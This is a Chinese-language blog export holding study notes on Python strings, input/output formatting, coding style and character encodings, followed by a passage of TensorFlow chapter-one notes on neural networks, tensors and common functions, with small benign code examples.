<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185640.png" alt="思维导图2.3"></p>
<ul>
<li>字符串也是Python中最常用的数据类型</li>
<li>文本就是由一些列字符组成的字符串</li>
</ul>
<h2 id="字符串的表示"><a href="#字符串的表示" class="headerlink" title="字符串的表示"></a>字符串的表示</h2><blockquote>
<p>字符串可以使用<strong>单引号(‘…’)</strong> 或者<strong>双引号(“…”)</strong> 表示—-&gt;</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185642.png" alt="eg2.3.1"></p>
<blockquote>
<p>对于字符串中含有引号的形式，需要进行<strong>特殊处理</strong>：—-&gt;</p>
</blockquote>
<ul>
<li>第一种方法：使用不同的引号将字符串括起来。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185646.png" alt="eg1"></p>
<ul>
<li>第二种方法：使用三引号</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185647.png" alt="eg2"></p>
<ul>
<li>第三章方法：使用转义字符\，在引号之前使用\进行转义</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185648.png" alt="eg3"></p>
<p>   注：使用\n可以实现换行输出</p>
<blockquote>
<p>原始字符串的使用—-&gt;</p>
</blockquote>
<p>如果我们输出的字符串含有\符号，那么处理可以使用转义字符外，还可以在字符串前加上r，就表示原始字符串，不会把\当成特殊符号。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185649.png" alt="eg"></p>
<h2 id="字符串的常用操作"><a href="#字符串的常用操作" class="headerlink" title="字符串的常用操作"></a>字符串的常用操作</h2><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185650.png" alt="思维导图"></p>
<h3 id="字符串的索引"><a href="#字符串的索引" class="headerlink" title="字符串的索引"></a>字符串的索引</h3><blockquote>
<p>在Python中，不支持单字符类型，单字符也是作为一个字符串使用。</p>
<blockquote>
<p>可以使用<strong>索引</strong>访问单个字符。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185651.png" alt="索引"></p>
<p>注：通过[x]获取对应位置的单字符，下标<strong>从0开始</strong></p>
<h3 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h3><blockquote>
<p>这是最基础的字符串操作：+</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185652.png" alt="拼接"></p>
<h3 id="常用的字符串方法"><a href="#常用的字符串方法" class="headerlink" title="常用的字符串方法"></a>常用的字符串方法</h3><blockquote>
<p>什么是方法？对象的行为称为方法，方法只能用于<strong>定义好的对象</strong>，函数是独立的操作。<br>调用对象的方法：<code>对象名.方法名</code></p>
</blockquote>
<ul>
<li><code>s.lower()</code> 转换为小写形式</li>
<li><code>s.upper()</code> 转换为大写形式</li>
<li><code>s.replace(&#39;old&#39;, &#39;new&#39;)</code> 内容的替换</li>
<li><code>s.find(p)</code> 查找p，存在返回下标，不存在返回-1</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185653.png" alt="eg"></p>
<p>注：通过上例我们可以看见，使用方法后不会改变对象的原始内容</p>
<ul>
<li><code> &#39;s&#39;.join(str)</code> 以指定的字符‘s’作为分隔符，将字符串str连接成一个新的字符串</li>
<li><code>str.split(s,[num]) </code>以s为指定的识别分隔符，将str字符串进行分割，num为分割次数。（无参数，默认按照空格进行分割）</li>
</ul>
<p>  <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185654.png" alt="eg"></p>
<p>注：通过上例我们可以看到，str.split(s, [num])会在字符串里寻找s，并以此为分隔符进行分割，分割过的字符串以引号隔开；而’s’.join(str1)则是将s作为分隔符加入到字符串，形成一个整体。<br><strong>如果使用str.split()则会自动以空白字符为分隔符。</strong></p>
<ul>
<li><code>reversed() </code>内置函数：字符串置逆<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185655.png" alt="eg"></li>
</ul>
<p>注：在进行分割后再使用置逆，会以分割的部分为整体进行，而不是以一个字符。</p>
<h3 id="字符串的转换"><a href="#字符串的转换" class="headerlink" title="字符串的转换"></a>字符串的转换</h3><blockquote>
<p>字符串与数字中间的转换</p>
</blockquote>
<ul>
<li><code>str(x)</code>：将数字转换为字符串</li>
<li><code>int(x)</code>：将字符串x转换为数字</li>
<li><code>int(x,d)</code>：将d进制的字符串转换为数字</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185656.png" alt="eg"></p>
<p>注：在使用int(x,d)指定d进制时要符合规范，例如:8进制时不可出现8以上数字。</p>
<blockquote>
<p>字符串与字符值</p>
</blockquote>
<p>在内存，字符是以整数值的形式进行存储的，具体值取决于编码规则。</p>
<ul>
<li><code>ord()</code>:返回字符的值</li>
<li><code>chr()</code>:返回给定编码指定的字符</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185657.png" alt="eg"> </p>
<blockquote>
<p>补充内容：<a href="https://www.php.cn/python-tutorials-471465.html#:~:text=python%E5%8E%BB%E6%8E%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%80%E6%9C%89%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A1%E3%80%81%E4%BD%BF%E7%94%A8strip%E6%96%B9%E6%B3%95%E5%8E%BB%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%BC%80%E5%A4%B4%E6%88%96%E8%80%85%E7%BB%93%E5%B0%BE%E7%9A%84%E7%A9%BA%E6%A0%BC%EF%BC%9B2%E3%80%81%E4%BD%BF%E7%94%A8replace%E6%96%B9%E6%B3%95%E5%8E%BB%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%93%E5%B0%BE%E7%9A%84%E7%A9%BA%E6%A0%BC%EF%BC%9B3%E3%80%81%20%E4%BD%BF%E7%94%A8join%E6%96%B9%E6%B3%95%2Bsplit%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8E%BB%E9%99%A4%E5%85%A8%E9%83%A8%E7%A9%BA%E6%A0%BC%E3%80%82%20%E6%9C%AC%E6%96%87%E6%93%8D%E4%BD%9C%E7%8E%AF%E5%A2%83%EF%BC%9Awindows7%E7%B3%BB%E7%BB%9F%E3%80%81python3.5%E7%89%88%EF%BC%8CDELL,G3%E7%94%B5%E8%84%91%E3%80%82%20%E4%BB%A5%E4%B8%8A%E5%B0%B1%E6%98%AFpython%E6%80%8E%E4%B9%88%E5%8E%BB%E6%8E%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%80%E6%9C%89%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%AF%A6%E7%BB%86%E5%86%85%E5%AE%B9%EF%BC%8C%E6%9B%B4%E5%A4%9A%E8%AF%B7%E5%85%B3%E6%B3%A8php%E4%B8%AD%E6%96%87%E7%BD%91%E5%85%B6%E5%AE%83%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%EF%BC%81%20%E5%A3%B0%E6%98%8E%EF%BC%9A%20%E6%9C%AC%E6%96%87%E5%8E%9F%E5%88%9B%E5%8F%91%E5%B8%83php%E4%B8%AD%E6%96%87%E7%BD%91%EF%BC%8C%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%EF%BC%8C%E6%84%9F%E8%B0%A2%E6%82%A8%E7%9A%84%E5%B0%8A%E9%87%8D%EF%BC%81">删除字符串里的空格（几种方法）</a></p>
</blockquote>
<h1 id="2-4-输入、输出"><a href="#2-4-输入、输出" class="headerlink" title="2.4 输入、输出"></a>2.4 输入、输出</h1><blockquote>
<p>本节思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185658.png" alt="思维导图2.4"></p>
<p>输入是Input,输出是Output,所以我们把输入输出简写为IO。<br>用户和计算机程序的交互离不开输入输出。</p>
<h2 id="输出：Output"><a href="#输出：Output" class="headerlink" title="输出：Output"></a>输出：Output</h2><blockquote>
<p>最基本的输出:<code>print()</code></p>
</blockquote>
<p><strong>作用</strong>：以字符的形式向控制台输出结果</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185659.png" alt="eg"></p>
<p>print() 可以接受一个或多个字符串，以逗号进行分割，输出时会<strong>使用空格</strong>进行替代</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><blockquote>
<p>（使用格式限定符对输出的格式进行美化）</p>
</blockquote>
<ul>
<li>%形式</li>
<li>str.format()形式</li>
</ul>
<h4 id="形式的输出"><a href="#形式的输出" class="headerlink" title="%形式的输出"></a>%形式的输出</h4><ul>
<li>%d 格式化一个整数</li>
<li>%f 格式化一个浮点数</li>
<li>%s 格式化一个字符串</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185676.png" alt="eg"></p>
<p><strong>注:</strong> 和C语言类似，小数点<strong>后为精度</strong>，<strong>前为宽度</strong>，不足以空格替。<br>    但是和C语言不同的是在字符串之后的替换中<strong>没有逗号</strong>，而是**使用%**进行。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185677.png" alt="eg"></p>
<p><strong>注</strong>：对应于多个替换，需要使用上图格式。</p>
<h4 id="“-”-dormat-str-格式化字符串函数"><a href="#“-”-dormat-str-格式化字符串函数" class="headerlink" title="“{}”.dormat(str)格式化字符串函数"></a>“{}”.dormat(str)格式化字符串函数</h4><p>{}叫做<strong>替换槽</strong>，其中可以指定<strong>填充的字符</strong>、<strong>对其方式</strong>、替换字符的<strong>宽度</strong>。<br>其中，^ &lt; &gt; 分别代表中间对齐、左对齐、右对齐</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185679.png" alt="eg"></p>
<blockquote>
<p>如果是数字，可以在槽里指定数字的格式</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185737.png" alt="eg"></p>
<p><strong>注</strong>：使用：b,o 指定进制格式。</p>
<h2 id="输入：Input"><a href="#输入：Input" class="headerlink" title="输入：Input"></a>输入：Input</h2><blockquote>
<p>最基本的输入:input</p>
</blockquote>
<ul>
<li>作用：从控制台接收用户信息的输出，并返回字符串</li>
<li>格式: <code>变量 = input(&lt;提示信息&gt;)</code></li>
<li>注意：接收到的变量属于字符串形式</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185738.png" alt="eg"></p>
<blockquote>
<p>格式的转换</p>
</blockquote>
<p>我们知道通过input接收的变量为字符串格式，所以如果需要使用数字类型，要使用前面的转换方法。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185739.png" alt="eg"></p>
<h3 id="eval-评估函数"><a href="#eval-评估函数" class="headerlink" title="eval()评估函数"></a>eval()评估函数</h3><p>作用：执行一个字符串表达式，并返回计算值<br>本质：剥离引号</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185740.png" alt="eg"></p>
<h1 id="2-5-代码规范"><a href="#2-5-代码规范" class="headerlink" title="2.5 代码规范"></a>2.5 代码规范</h1><blockquote>
<p>编程语言从某种意义上来说作为一种工具，需要遵循一套<strong>编码规范</strong><br>在PEP8中有具体的描述：<a href="https://www.python.org/dev/peps/pep-0008">https://www.python.org/dev/peps/pep-0008</a></p>
</blockquote>
<blockquote>
<p>规范1：缩进</p>
</blockquote>
<ul>
<li>在Python里，使用缩进来体现代码之间的逻辑关系。</li>
<li>同一级别的代码块的缩进必须相同。</li>
<li>一般使用4个空格或者一个Tab作为一个缩进量。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185741.png" alt="缩进错误"></p>
<blockquote>
<p>规范2：注释</p>
</blockquote>
<ul>
<li>单行注释：以#开头，其后的内容为注释内容</li>
<li>多行注释：使用三个单引号或者双引号作为开始和结束标识</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185742.png" alt="eg"></p>
<p>注：前面我们知道，三引号也可以作为字符串的标识</p>
<blockquote>
<p>规范3：换行</p>
</blockquote>
<p>如果一个语句太长，可以使用换行符\进行换行<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185743.png" alt="eg"></p>
<blockquote>
<p>规范4： 必要的空行或空格</p>
</blockquote>
<ul>
<li>运算符两侧、逗号后面建议加一个空格。</li>
<li>不同功能之间的代码块建议之间加一个空行</li>
</ul>
<h1 id="2-6-字符编码"><a href="#2-6-字符编码" class="headerlink" title="2.6 字符编码"></a>2.6 字符编码</h1><blockquote>
<p>常用的编码格式：</p>
</blockquote>
<ul>
<li><strong>ACSII编码</strong>：最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号。这个编码表被称为ASCII编码。</li>
<li><strong>GB2312编码</strong>：处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII码冲突，所以中国制定了GB2312编码用于处理中文。</li>
<li><strong>Unicode编码</strong>：使用两个字节表示一个字符，把所有的语言统一到一个编码格式下。</li>
<li><strong>UTF-8编码</strong>：为了节省空间，出现了“可变长编码”即UTF-8编码，UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节。常用的英文字母为1个字节，汉字通常为3个字节，很生僻的字符我为4-6个字节。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185791.png" alt="eg"></p>
<p><strong>注</strong>:一般我们使用记事本编写代码时，如果使用了中文，记得设置为UTF-8的编码格式。<br>在开头使用：<code># coding=utf-8</code>即可进行声明</p>
<blockquote>
<p>解码和编码:</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185806.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185914.png"></p>
<h1 id="综合示例程序：芳名和芳龄"><a href="#综合示例程序：芳名和芳龄" class="headerlink" title="综合示例程序：芳名和芳龄"></a>综合示例程序：芳名和芳龄</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">first_name = <span class="built_in">input</span>(<span class="string">&quot;请输入你的姓氏：&quot;</span>)</span><br><span class="line">last_name = <span class="built_in">input</span>(<span class="string">&quot;请输入你的名字：&quot;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的年龄&quot;</span>))</span><br><span class="line"></span><br><span class="line">age_10 = age-<span class="number">10</span></span><br><span class="line">age_10_8 = <span class="built_in">oct</span>(age_10)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十年前你的年龄为：%o(八进制)&quot;</span>%age_10)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十年前你的年龄为:&#123;:x&#125;(十六进制)&quot;</span>.<span class="built_in">format</span>(age_10))</span><br><span class="line"></span><br><span class="line">full_name = first_name + last_name</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:*^10&#125;&quot;</span>.<span class="built_in">format</span>(full_name), <span class="string">&quot;的国标码为：&quot;</span>, full_name.encode(<span class="string">&quot;GBK&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意点：<br>1、print之中的不同字符串可以使用逗号隔开，不用+<br>2、进制的转换输出可以直接使用%o,%d,%x。<br>3、编码格式时要使用引号”GBK”</p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow笔记--ch1 神经网络计算</title>
    <url>/2023/05/01/TenforFlow%E7%AC%94%E8%AE%B0--ch1%20%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：本篇文章时学习后的收获总结，学习流程大体如下：看视频—&gt; 根据ppt整理  —&gt; 阅读笔记后进行补充。（笔记自看，多思考；实践必做，跑dome)<br>我将使用深区域进行笔记的最后补充。（深区域就是这行字所在的区域）</p>
</blockquote>
<h1 id="人工智能三学派"><a href="#人工智能三学派" class="headerlink" title="人工智能三学派"></a>人工智能三学派</h1><blockquote>
<p>什么是人工智能？让机器具备<strong>人的思维和意识</strong>。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919391.png" alt="三大学派"></p>
<h2 id="笔记补充"><a href="#笔记补充" class="headerlink" title="笔记补充"></a>笔记补充</h2><blockquote>
<p>连接主义的神经网络</p>
</blockquote>
<p>基于连接主义的神经网络模仿神经元，使计算机具有感性思维。图 1.2展示了从出生到成年，人脑中神经网络的变化。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919544.png"><br>随着我们的成长，大量的数据通过<strong>视觉、听觉</strong>涌入大脑，使我们的神经网络连接，也就是这些神经元连接线上的<strong>权重</strong>发生了变化，有些线上的权重增强了，有些线上的权重减弱了。如图 1.3 所示<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919390.png"></p>
<h1 id="基于连接主义的神经网络设计过程"><a href="#基于连接主义的神经网络设计过程" class="headerlink" title="基于连接主义的神经网络设计过程"></a>基于连接主义的神经网络设计过程</h1><blockquote>
<p>神经网络设计过程?</p>
</blockquote>
<p>我们要用计算机模仿刚刚说到的神经网络连接关系，让计算机具备感性思维。<br>首先，需要<strong>准备数据</strong>，数据量<strong>越大越好</strong>，要构成<strong>特征和标签对</strong>。如要识别猫，就要有大量猫的图片和这个图片是猫的标签，构成特征标签对。<br>随后，搭建神经网络的<strong>网络结构</strong>，并通过<strong>反向传播</strong>，优化连线的权重，直到模型的识别准确率达到要求，得到最优的连线权重，把这个<strong>模型保存</strong>起来。<br>最后，用保存的模型，输入从未见过的新数据，它会通过<strong>前向传播</strong>，输出概率值，概率值最大的一个，就是分类或预测的结果。下图展示了搭建与使用神经网络模型的流程。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919570.png" alt="神经网络设计过程"></p>
<blockquote>
<p>举一个例子：给鸢尾花分类（Iris）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919581.png" alt="eg1"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919568.png" alt="eg2"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919385.png" alt="搭建网络"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919558.png" alt="喂入数据"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919565.png" alt="前向传播"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919561.png" alt="损失函数"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919567.png" alt="梯度下降"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919564.png" alt="反向传播"></p>
<p>示例代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">w = tf.Variable(tf.constant(<span class="number">5</span>, dtype=tf.float32))</span><br><span class="line">lr = <span class="number">0.2</span></span><br><span class="line">epoch = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  </span><br><span class="line"><span class="comment"># for epoch 定义顶层循环，表示对数据集循环epoch次，此例数据集数据仅有1个w,初始化时候constant赋值为5，循环40次迭代。</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  </span><br><span class="line">	<span class="comment"># with结构到grads框起了梯度的计算过程。</span></span><br><span class="line">        loss = tf.square(w + <span class="number">1</span>)</span><br><span class="line">    grads = tape.gradient(loss, w)  </span><br><span class="line">	<span class="comment"># .gradient函数告知谁对谁求导</span></span><br><span class="line"></span><br><span class="line">    w.assign_sub(lr * grads)  </span><br><span class="line">	<span class="comment"># .assign_sub 对变量做自减 即：w -= lr*grads 即 w = w - lr*grads</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;After %s epoch,w is %f,loss is %f&quot;</span> % (epoch, w.numpy(), loss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># lr初始值：0.2   请自改学习率  0.001  0.999 看收敛过程</span></span><br><span class="line"><span class="comment"># 最终目的：找到 loss 最小 即 w = -1 的最优参数w</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码结果：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919382.png" alt="结果"></p>
<p>可见，经过18次迭代之后就可以得到最小值。但是如果<strong>学习率过小</strong>，经过40次迭代也无法得到最小值；如果<strong>学习率过大</strong>，会在最小值之间跳动，也无法得到最小值。所以我们需要通过更加科学的方法<strong>动态调整学习率</strong>，以达到最佳识别效果。</p>
<h1 id="张量生成"><a href="#张量生成" class="headerlink" title="张量生成"></a>张量生成</h1><blockquote>
<p>张量是TensorFlow的基础，从其名称就可以看出来。属于tensorflow的数据类型。<br>关于张量的知识有很多，下面我们以其中的几个典型来介绍：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919392.png" alt="张量"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919389.png" alt="dtype"></p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919383.png" alt="创建一个张量"></p>
<p>注：这里使用tf.constant创建的张量属于常量。要使用[xx]格式给出具体值，这里<strong>有几层中括号其维度就是多少</strong>，具体可以看上张量图。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919393.png" alt="np转换"></p>
<p>注：将numpy生成的一维数组转换为张量（带有维度、数据类型）</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919560.png" alt="同数张量"></p>
<p>注：使用这种方法可以创建数据相同的张量。不过其参数要给出维度，<strong>逗号分隔开几个数就有几维</strong>。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919563.png" alt="正态分布"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919384.png" alt="eg"></p>
<p>注：函数较长，但是都是<strong>属于random</strong>。并且这个是属于<strong>随机生成</strong>，不需要指定数据。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919782.png" alt="均匀分布"></p>
<p>注：与上正态分布格式类似，不过分布不同。</p>
<h1 id="常用tf函数"><a href="#常用tf函数" class="headerlink" title="常用tf函数"></a>常用tf函数</h1><blockquote>
<p>tf.cast与tf.reduce_max+tf.reduce_min</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919783.png" alt="常用函数1"></p>
<p>注：使用cast转换后<strong>仍为张量</strong>，只是改名数据类型。<br>注2：<code>tf.reduce</code>有很多类别，上面已经有了max和min，取值后仍为张量。<br>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">x1 = tf.constant([<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>], dtype=tf.float64)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x1:&quot;</span>, x1)</span><br><span class="line">x2 = tf.cast(x1, tf.int32)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x2&quot;</span>, x2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;minimum of x2：&quot;</span>, tf.reduce_min(x2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;maxmum of x2:&quot;</span>, tf.reduce_max(x2))</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919784.png" alt="axis"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919887.png" alt="axis示例"></p>
<p>注：这里的axis可以指定计算的区域，<strong>0为纵向，1为横向</strong>。</p>
<p>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">x = tf.constant([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>, x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mean of x:&quot;</span>, tf.reduce_mean(x))  <span class="comment"># 求x中所有数的均值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sum of x:&quot;</span>, tf.reduce_sum(x, axis=<span class="number">1</span>))  <span class="comment"># 求每一行的和</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919785.png" alt="变量"><br>注：使用<code>tf.Variable</code>可以生成变量，常用于训练量。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919788.png" alt="数学运算"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919786.png" alt="四则运算"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074919789.png" alt="eg1"></p>
